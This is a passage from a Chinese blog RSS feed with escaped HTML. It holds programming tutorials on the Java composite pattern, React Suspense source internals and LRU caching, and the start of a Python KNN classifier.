    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; display() {
        System.out.println(name);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;IFile&amp;gt;&lt;span&gt; getChild() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; add(IFile file) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; remove(IFile file) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }
}

&lt;/span&gt;&lt;span&gt;////////////////////&lt;/span&gt;&lt;span&gt; 目录节点&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.ArrayList;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Folder &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; IFile{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; List&amp;lt;IFile&amp;gt; children; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 聚合了文件抽象节点&lt;/span&gt;
    
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Folder(String name) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
        children &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;IFile&amp;gt;&lt;span&gt;();
    }
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; display() {
        System.out.println(name);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;IFile&amp;gt;&lt;span&gt; getChild() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; children;
    }


    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; add(IFile file) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; children.add(file);
    }


    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; remove(IFile file) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; children.remove(file);
    }
}

&lt;/span&gt;&lt;span&gt;////////////////////&lt;/span&gt;&lt;span&gt;客户端&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MainClass {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        IFile rootFolder &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Folder(&quot;C:&quot;&lt;span&gt;);
        IFile dashuaiFolder &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Folder(&quot;dashuai&quot;&lt;span&gt;);
        IFile dashuaiFile &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; File(&quot;dashuai.txt&quot;&lt;span&gt;);
        rootFolder.add(dashuaiFolder);
        rootFolder.add(dashuaiFile);
        
        IFile aFolder &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Folder(&quot;aFolder&quot;&lt;span&gt;);
        IFile aFile &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; File(&quot;aFile.txt&quot;&lt;span&gt;);
        dashuaiFolder.add(aFolder);
        dashuaiFolder.add(aFile);
        
        displayTree(rootFolder, &lt;/span&gt;0&lt;span&gt;);
    }
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 层序遍历树&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; displayTree(IFile rootFolder, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; deep) {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; deep; i++&lt;span&gt;) {
            System.out.print(&lt;/span&gt;&quot;--&quot;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;显示自身的名称&lt;/span&gt;
&lt;span&gt;        rootFolder.display();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获得子树&lt;/span&gt;
        List&amp;lt;IFile&amp;gt; children =&lt;span&gt; rootFolder.getChild();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;遍历子树&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt;&lt;span&gt;(IFile file : children) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(file &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; File) {
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt;= deep; i++&lt;span&gt;) {
                    System.out.print(&lt;/span&gt;&quot;--&quot;&lt;span&gt;);
                }
                file.display();
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                displayTree(file, deep &lt;/span&gt;+ 1&lt;span&gt;);
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
</description>
<pubDate>Mon, 04 Mar 2019 18:34:00 +0000</pubDate>
<dc:creator>dashuai的博客</dc:creator>
<og:description>1、前言 本模式经 遍历“容器”的优雅方法——总结迭代器模式 引出，继续看最后的子菜单的案例 2、组合模式的概念 组合模式，也叫 Composite 模式……是构造型的设计模式之一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kubixuesheng/p/10353328.html</dc:identifier>
</item>
<item>
<title>深度理解 React Suspense(附源码解析) - 牧云云</title>
<link>http://www.cnblogs.com/MuYunyun/p/10474277.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/MuYunyun/p/10474277.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/3/4/169496b65bb39ede?w=640&amp;amp;h=280&amp;amp;f=jpeg&amp;amp;s=17742&quot;/&gt;&lt;/p&gt;
&lt;p&gt;本文介绍与 &lt;code&gt;Suspense&lt;/code&gt; 在三种情景下使用方法，并结合源码进行相应解析。欢迎关注&lt;a href=&quot;https://github.com/MuYunyun/blog&quot;&gt;个人博客&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;code-spliting&quot;&gt;Code Spliting&lt;/h3&gt;
&lt;p&gt;在 16.6 版本之前，&lt;code&gt;code-spliting&lt;/code&gt; 通常是由第三方库来完成的，比如 &lt;a href=&quot;https://github.com/jamiebuilds/react-loadable&quot;&gt;react-loadble&lt;/a&gt;(核心思路为: 高阶组件 + webpack dynamic import), 在 16.6 版本中提供了 &lt;code&gt;Suspense&lt;/code&gt; 和 &lt;code&gt;lazy&lt;/code&gt; 这两个钩子, 因此在之后的版本中便可以使用其来实现 &lt;code&gt;Code Spliting&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;8.3129770992366&quot;&gt;
&lt;p&gt;目前阶段, 服务端渲染中的 &lt;code&gt;code-spliting&lt;/code&gt; 还是得使用 &lt;code&gt;react-loadable&lt;/code&gt;, 可查阅 &lt;a href=&quot;https://reactjs.org/docs/code-splitting.html#reactlazy&quot;&gt;React.lazy&lt;/a&gt;, 暂时先不探讨原因。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;Code Spliting&lt;/code&gt; 在 &lt;code&gt;React&lt;/code&gt; 中的使用方法是在 &lt;code&gt;Suspense&lt;/code&gt; 组件中使用 &lt;code&gt;&amp;lt;LazyComponent&amp;gt;&lt;/code&gt; 组件:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;import { Suspense, lazy } from 'react'

const DemoA = lazy(() =&amp;gt; import('./demo/a'))
const DemoB = lazy(() =&amp;gt; import('./demo/b'))

&amp;lt;Suspense&amp;gt;
  &amp;lt;NavLink to=&quot;/demoA&quot;&amp;gt;DemoA&amp;lt;/NavLink&amp;gt;
  &amp;lt;NavLink to=&quot;/demoB&quot;&amp;gt;DemoB&amp;lt;/NavLink&amp;gt;

  &amp;lt;Router&amp;gt;
    &amp;lt;DemoA path=&quot;/demoA&quot; /&amp;gt;
    &amp;lt;DemoB path=&quot;/demoB&quot; /&amp;gt;
  &amp;lt;/Router&amp;gt;
&amp;lt;/Suspense&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;源码中 &lt;code&gt;lazy&lt;/code&gt; 将传入的参数封装成一个 &lt;code&gt;LazyComponent&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;function lazy(ctor) {
  return {
    $$typeof: REACT_LAZY_TYPE, // 相关类型
    _ctor: ctor,
    _status: -1,   // dynamic import 的状态
    _result: null, // 存放加载文件的资源
  };
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;观察 &lt;a href=&quot;https://github.com/MuYunyun/react/blob/29b7b775f2ecf878eaf605be959d959030598b07/packages/react-reconciler/src/ReactFiberLazyComponent.js#L30-L87&quot;&gt;readLazyComponentType&lt;/a&gt; 后可以发现 &lt;code&gt;dynamic import&lt;/code&gt; 本身类似 &lt;code&gt;Promise&lt;/code&gt; 的执行机制, 也具有 &lt;code&gt;Pending&lt;/code&gt;、&lt;code&gt;Resolved&lt;/code&gt;、&lt;code&gt;Rejected&lt;/code&gt; 三种状态, 这就比较好理解为什么 &lt;code&gt;LazyComponent&lt;/code&gt; 组件需要放在 &lt;code&gt;Suspense&lt;/code&gt; 中执行了(&lt;code&gt;Suspense&lt;/code&gt; 中提供了相关的捕获机制, 下文会进行模拟实现`), 相关源码如下:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;function readLazyComponentType(lazyComponent) {
  const status = lazyComponent._status;
  const result = lazyComponent._result;
  switch (status) {
    case Resolved: { // Resolve 时，呈现相应资源
      const Component = result;
      return Component;
    }
    case Rejected: { // Rejected 时，throw 相应 error
      const error = result;
      throw error;
    }
    case Pending: {  // Pending 时, throw 相应 thenable
      const thenable = result;
      throw thenable;
    }
    default: { // 第一次执行走这里
      lazyComponent._status = Pending;
      const ctor = lazyComponent._ctor;
      const thenable = ctor(); // 可以看到和 Promise 类似的机制
      thenable.then(
        moduleObject =&amp;gt; {
          if (lazyComponent._status === Pending) {
            const defaultExport = moduleObject.default;
            lazyComponent._status = Resolved;
            lazyComponent._result = defaultExport;
          }
        },
        error =&amp;gt; {
          if (lazyComponent._status === Pending) {
            lazyComponent._status = Rejected;
            lazyComponent._result = error;
          }
        },
      );
      // Handle synchronous thenables.
      switch (lazyComponent._status) {
        case Resolved:
          return lazyComponent._result;
        case Rejected:
          throw lazyComponent._result;
      }
      lazyComponent._result = thenable;
      throw thenable;
    }
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;async-data-fetching&quot;&gt;Async Data Fetching&lt;/h3&gt;
&lt;p&gt;为了解决获取的数据在不同时刻进行展现的问题(在 &lt;a href=&quot;https://github.com/demos-platform/suspenseDemo&quot;&gt;suspenseDemo&lt;/a&gt; 中有相应演示), &lt;code&gt;Suspense&lt;/code&gt; 给出了解决方案。&lt;/p&gt;
&lt;p&gt;下面放两段代码，可以从中直观地感受在 &lt;code&gt;Suspense&lt;/code&gt; 中使用 &lt;code&gt;Async Data Fetching&lt;/code&gt; 带来的便利。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;一般进行数据获取的代码如下:&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;export default class Demo extends Component {
  state = {
    data: null,
  };

  componentDidMount() {
    fetchAPI(`/api/demo/${this.props.id}`).then((data) =&amp;gt; {
      this.setState({ data });
    });
  }

  render() {
    const { data } = this.state;

    if (data == null) {
      return &amp;lt;Spinner /&amp;gt;;
    }

    const { name } = data;

    return (
      &amp;lt;div&amp;gt;{name}&amp;lt;/div&amp;gt;
    );
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;在 &lt;code&gt;Suspense&lt;/code&gt; 中进行数据获取的代码如下:&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;const resource = unstable_createResource((id) =&amp;gt; {
  return fetchAPI(`/api/demo`)
})

function Demo {
  render() {
    const data = resource.read(this.props.id)

    const { name } = data;

    return (
      &amp;lt;div&amp;gt;{name}&amp;lt;/div&amp;gt;
    );
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到在 &lt;code&gt;Suspense&lt;/code&gt; 中进行数据获取的代码量相比正常的进行数据获取的代码少了将近一半！少了哪些地方呢?&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;减少了 &lt;code&gt;loading&lt;/code&gt; 状态的维护(在最外层的 Suspense 中统一维护子组件的 loading)&lt;/li&gt;
&lt;li&gt;减少了不必要的生命周期的书写&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;总结-如何在-suspense-中使用-data-fetching&quot;&gt;总结: 如何在 Suspense 中使用 Data Fetching&lt;/h3&gt;
&lt;p&gt;当前 &lt;code&gt;Suspense&lt;/code&gt; 的使用分为三个部分:&lt;/p&gt;
&lt;p&gt;第一步: 用 &lt;code&gt;Suspens&lt;/code&gt; 组件包裹子组件&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;import { Suspense } from 'react'

&amp;lt;Suspense fallback={&amp;lt;Loading /&amp;gt;}&amp;gt;
  &amp;lt;ChildComponent&amp;gt;
&amp;lt;/Suspense&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二步: 在子组件中使用 &lt;code&gt;unstable_createResource&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;import { unstable_createResource } from 'react-cache'

const resource = unstable_createResource((id) =&amp;gt; {
  return fetch(`/demo/${id}`)
})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第三步: 在 &lt;code&gt;Component&lt;/code&gt; 中使用第一步创建的 &lt;code&gt;resource&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;const data = resource.read('demo')&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;相关思路解读&quot;&gt;相关思路解读&lt;/h3&gt;
&lt;p&gt;来看下源码中 &lt;code&gt;unstable_createResource&lt;/code&gt; 的部分会比较清晰:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;export function unstable_createResource(fetch, maybeHashInput) {
  const resource = {
    read(input) {
      ...
      const result = accessResult(resource, fetch, input, key);
      switch (result.status) {
        case Pending: {
          const suspender = result.value;
          throw suspender;
        }
        case Resolved: {
          const value = result.value;
          return value;
        }
        case Rejected: {
          const error = result.value;
          throw error;
        }
        default:
          // Should be unreachable
          return (undefined: any);
      }
    },
  };
  return resource;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结合该部分源码, 进行如下推测:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;第一次请求没有缓存, 子组件 &lt;code&gt;throw&lt;/code&gt; 一个 &lt;code&gt;thenable&lt;/code&gt; 对象, &lt;code&gt;Suspense&lt;/code&gt; 组件内的 &lt;code&gt;componentDidCatch&lt;/code&gt; 捕获之, 此时展示 &lt;code&gt;Loading&lt;/code&gt; 组件;&lt;/li&gt;
&lt;li&gt;当 &lt;code&gt;Promise&lt;/code&gt; 态的对象变为完成态后, 页面刷新此时 &lt;code&gt;resource.read()&lt;/code&gt; 获取到相应完成态的值;&lt;/li&gt;
&lt;li&gt;之后如果相同参数的请求, 则走 &lt;code&gt;LRU&lt;/code&gt; 缓存算法, 跳过 &lt;code&gt;Loading&lt;/code&gt; 组件返回结果(缓存算法见后记);&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;官方作者是说法如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/3/4/169496b64abb4992?w=599&amp;amp;h=400&amp;amp;f=jpeg&amp;amp;s=40189&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以说法大致相同, 下面实现一个简单版的 &lt;code&gt;Suspense&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;jsx&quot;&gt;
&lt;code&gt;class Suspense extends React.Component {
  state = {
    promise: null
  }

  componentDidCatch(e) {
    if (e instanceof Promise) {
      this.setState({
        promise: e
      }, () =&amp;gt; {
        e.then(() =&amp;gt; {
          this.setState({
            promise: null
          })
        })
      })
    }
  }

  render() {
    const { fallback, children } = this.props
    const { promise } = this.state
    return &amp;lt;&amp;gt;
      { promise ? fallback : children }
    &amp;lt;/&amp;gt;
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;进行如下调用&lt;/p&gt;
&lt;pre class=&quot;jsx&quot;&gt;
&lt;code&gt;&amp;lt;Suspense fallback={&amp;lt;div&amp;gt;loading...&amp;lt;/div&amp;gt;}&amp;gt;
  &amp;lt;PromiseThrower /&amp;gt;
&amp;lt;/Suspense&amp;gt;

let cache = &quot;&quot;;
let returnData = cache;
const fetch = () =&amp;gt;
  new Promise(resolve =&amp;gt; {
    setTimeout(() =&amp;gt; {
      resolve(&quot;数据加载完毕&quot;);
    }, 2000);
  });

class PromiseThrower extends React.Component {
  getData = () =&amp;gt; {
    const getData = fetch();

    getData.then(data =&amp;gt; {
      returnData = data;
    });
    if (returnData === cache) {
      throw getData;
    }
    return returnData;
  };

  render() {
    return &amp;lt;&amp;gt;{this.getData()}&amp;lt;/&amp;gt;;
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/3/4/169496b648f0f2a5?w=264&amp;amp;h=123&amp;amp;f=gif&amp;amp;s=2047&quot;/&gt;&lt;/p&gt;
&lt;p&gt;效果调试可以点击&lt;a href=&quot;https://codesandbox.io/s/1zy82mm0j4&quot;&gt;这里&lt;/a&gt;, 在 &lt;code&gt;16.6&lt;/code&gt; 版本之后, &lt;code&gt;componentDidCatch&lt;/code&gt; 只能捕获 &lt;code&gt;commit phase&lt;/code&gt; 的异常。所以在 &lt;code&gt;16.6&lt;/code&gt; 版本之后实现的 &lt;code&gt;&amp;lt;PromiseThrower&amp;gt;&lt;/code&gt; 又有一些差异(即将 &lt;code&gt;throw thenable&lt;/code&gt; 移到 &lt;code&gt;componentDidMount&lt;/code&gt; 中进行)。&lt;/p&gt;
&lt;h3 id=&quot;concurrentmode-suspense&quot;&gt;ConcurrentMode + Suspense&lt;/h3&gt;
&lt;p&gt;当网速足够快, 数据立马就获取到了，此时页面存在的 &lt;code&gt;Loading&lt;/code&gt; 按钮就显得有些多余了。(在 &lt;a href=&quot;https://github.com/demos-platform/suspenseDemo&quot;&gt;suspenseDemo&lt;/a&gt; 中有相应演示), &lt;code&gt;Suspense&lt;/code&gt; 在 &lt;code&gt;Concurrent Mode&lt;/code&gt; 下给出了相应的解决方案, 其提供了 &lt;code&gt;maxDuration&lt;/code&gt; 参数。用法如下:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;&amp;lt;Suspense maxDuration={500} fallback={&amp;lt;Loading /&amp;gt;}&amp;gt;
  ...
&amp;lt;/Suspense&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该 Demo 的效果为当获取数据的时间大于(是否包含等于还没确认) 500 毫秒, 显示自定义的 &lt;code&gt;&amp;lt;Loading /&amp;gt;&lt;/code&gt; 组件, 当获取数据的时间小于 500 毫秒, 略过 &lt;code&gt;&amp;lt;Loading&amp;gt;&lt;/code&gt; 组件直接展示用户的数据。&lt;a href=&quot;https://github.com/MuYunyun/react/blob/29b7b775f2ecf878eaf605be959d959030598b07/packages/react-reconciler/src/ReactFiberUnwindWork.js#L232-L242&quot;&gt;相关源码&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;需要注意的是 &lt;code&gt;maxDuration&lt;/code&gt; 属性只有在 &lt;code&gt;Concurrent Mode&lt;/code&gt; 下才生效, 可参考&lt;a href=&quot;https://github.com/MuYunyun/react/blob/29b7b775f2ecf878eaf605be959d959030598b07/packages/react-reconciler/src/ReactFiberUnwindWork.js#L270-L277&quot;&gt;源码中的注释&lt;/a&gt;。在 Sync 模式下, &lt;code&gt;maxDuration&lt;/code&gt; 始终为 0。&lt;/p&gt;
&lt;h3 id=&quot;后记-缓存算法&quot;&gt;后记: 缓存算法&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;LRU&lt;/code&gt; 算法: &lt;code&gt;Least Recently Used&lt;/code&gt; 最近最少使用算法(根据时间);&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LFU&lt;/code&gt; 算法: &lt;code&gt;Least Frequently Used&lt;/code&gt; 最近最少使用算法(根据次数);&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5c0392656fb9a049fb4366fa&quot;&gt;漫画：什么是 LRU 算法&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;若数据的长度限定是 3, 访问顺序为 &lt;code&gt;set(2,2),set(1,1),get(2),get(1),get(2),set(3,3),set(4,4)&lt;/code&gt;, 则根据 &lt;code&gt;LRU&lt;/code&gt; 算法删除的是 &lt;code&gt;(3, 3)&lt;/code&gt;, 根据 &lt;code&gt;LFU&lt;/code&gt; 算法删除的是 &lt;code&gt;(1, 1)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;react-cache&lt;/code&gt; 采用的是 &lt;code&gt;LRU&lt;/code&gt; 算法。&lt;/p&gt;
&lt;h3 id=&quot;相关资料&quot;&gt;相关资料&lt;/h3&gt;
</description>
<pubDate>Mon, 04 Mar 2019 16:12:00 +0000</pubDate>
<dc:creator>牧云云</dc:creator>
<og:description>本文介绍与 在三种情景下使用方法，并结合源码进行相应解析。欢迎关注 '个人博客' 。 Code Spliting 在 16.6 版本之前， 通常是由第三方库来完成的，比如 'react loadble</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/MuYunyun/p/10474277.html</dc:identifier>
</item>
<item>
<title>Python 实现 KNN（K-近邻）算法 - Max_Lyu</title>
<link>http://www.cnblogs.com/lyuzt/p/10471617.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lyuzt/p/10471617.html</guid>
<description>
&lt;h2&gt;一、概述&lt;/h2&gt;
&lt;p&gt;　　KNN（K-最近邻）算法是相对比较简单的机器学习算法之一，它主要用于对事物进行分类。用比较官方的话来说就是：给定一个训练数据集，对新的输入实例，在训练数据集中找到与该实例最邻近的K个实例， 这K个实例的多数属于某个类，就把该输入实例分类到这个类中。为了更好地理解，通过一个简单的例子说明。&lt;/p&gt;
&lt;p&gt;　　我们有一组自拟的关于电影中镜头的数据：&lt;/p&gt;
&lt;p&gt;                         &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225959776-1524757039.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　那么问题来了，如果有一部电影 X，它的打戏为 3，吻戏为 2。那么这部电影应该属于哪一类？&lt;/p&gt;
&lt;p&gt;　　我们把所有数据通过图表显示出来（圆点代表的是自拟的数据，也称训练集；三角形代表的是 X 电影的数据，称为测试数据）：&lt;/p&gt;
&lt;p&gt;                                   &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304220203111-673476942.png&quot; alt=&quot;&quot; width=&quot;433&quot; height=&quot;386&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　计算测试数据到训练数据之间的距离，假设 k 为 3，那么我们就找到距离中最小的三个点，假如 3 个点中有 2 个属于动作片，1 个属于爱情片，那么把该电影 X 分类为动作片。这种通过计算距离总结 k 个最邻近的类，按照”少数服从多数“原则分类的算法就为 KNN（K-近邻）算法。&lt;/p&gt;

&lt;h2&gt;二、算法介绍&lt;/h2&gt;
&lt;p&gt;　　还是以上面的数据为例，打戏数为 x，吻戏数为 y，通过欧式距离公式计算测试数据到训练数据的距离，我上中学那会儿不知道这个叫做欧式距离公式，一直用”两点间的距离公式“来称呼这个公式： &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225426690-906874238.png&quot; alt=&quot;&quot;/&gt;。但是现实中的很多数据都是多维的，即使如此，也还是按照这个思路进行计算，比如如果是三维的话，就在根号里面再加上 z 轴差的平方，即 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230517991-136171368.png&quot; alt=&quot;&quot;/&gt;，以此类推。&lt;/p&gt;
&lt;p&gt;　　知道了这个计算公式，就可以计算各个距离了。我们以到最上面的点的距离为例：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225205017-426074475.png&quot; alt=&quot;&quot;/&gt;，那么从上到下的距离分别是：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225603424-80709055.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230202766-1650691102.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230212239-1671807566.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230216424-1233936688.png&quot; alt=&quot;&quot;/&gt;。现在我们把 k 定为 3，那么距离最近的就是后面三个数了，在这三个数中，有两个属于动作片，因此，电影 X 就分类为动作片。&lt;/p&gt;

&lt;h2&gt;三、算法实现&lt;/h2&gt;
&lt;p&gt;　　知道了原理，那就可以用代码实现了，这里就不再赘述了，直接上带注释的 Python 代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;'''&lt;/span&gt;&lt;span&gt;
    trainData - 训练集
    testData - 测试集
    labels - 分类
&lt;/span&gt;&lt;span&gt;'''&lt;/span&gt;
&lt;span&gt;def&lt;/span&gt;&lt;span&gt; knn(trainData, testData, labels, k):
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算训练样本的行数&lt;/span&gt;
    rowSize =&lt;span&gt; trainData.shape[0]
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算训练样本和测试样本的差值&lt;/span&gt;
    diff = np.tile(testData, (rowSize, 1)) -&lt;span&gt; trainData
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算差值的平方和&lt;/span&gt;
    sqrDiff = diff ** 2&lt;span&gt;
    sqrDiffSum &lt;/span&gt;= sqrDiff.sum(axis=1&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算距离&lt;/span&gt;
    distances = sqrDiffSum ** 0.5
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对所得的距离从低到高进行排序&lt;/span&gt;
    sortDistance =&lt;span&gt; distances.argsort()
    
    count &lt;/span&gt;=&lt;span&gt; {}
    
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(k):
        vote &lt;/span&gt;=&lt;span&gt; labels[sortDistance[i]]
        count[vote] &lt;/span&gt;= count.get(vote, 0) + 1
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对类别出现的频数从高到低进行排序&lt;/span&gt;
    sortCount = sorted(count.items(), key=operator.itemgetter(1), reverse=&lt;span&gt;True)
    
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回出现频数最高的类别&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt; sortCount[0][0] 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　ps：np.tile(testData, (rowSize, 1)) 是将 testData 这个数据扩展为 rowSize 列，这样能避免运算错误；&lt;/p&gt;
&lt;p&gt;　　　　sorted(count.items(), key=operator.itemgetter(1), reverse=True) 排序函数，里面的参数 key=operator.itemgetter(1), reverse=True 表示按照 count 这个字典的值（value）从高到低排序，如果把 1 换成 0，则是按字典的键（key）从高到低排序。把 True 换成 False 则是从低到高排序。&lt;/p&gt;

&lt;h2&gt; 四、测试与总结&lt;/h2&gt;
&lt;p&gt;　　用 Python 实现了算法之后，我们用上面的数据进行测试，看一下结果是否和我们预测的一样为动作片：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
